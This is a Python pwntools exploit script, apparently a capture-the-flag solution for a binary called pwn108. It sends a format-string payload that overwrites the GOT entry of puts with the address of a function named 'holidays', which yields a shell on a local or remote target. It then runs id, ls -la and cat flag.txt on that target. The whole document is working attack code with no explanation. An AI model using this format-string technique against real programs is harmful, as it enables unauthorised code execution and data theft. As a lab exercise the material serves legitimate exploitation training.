from pwn import *
import time

context.binary = ELF('./pwn108-1644300489260.pwn108')

puts_got = 0x404018
holidays = 0x40123b

if args.REMOTE:
    p = remote('10.128.131.51', 9008)
else:
    p = process('./pwn108-1644300489260.pwn108')

p.recvuntil(b'=[Your name]: ')
p.sendline(b'AAAA')
p.recvuntil(b'=[Your Reg No]: ')

payload = fmtstr_payload(10, {puts_got: holidays}, write_size='byte')
log.info(f"Payload size: {len(payload)}")

p.sendline(payload)

time.sleep(0.5)
p.sendline(b'id')
p.sendline(b'ls -la')
p.sendline(b'cat flag.txt')

time.sleep(1)
print(p.recvrepeat(3).decode(errors='replace'))
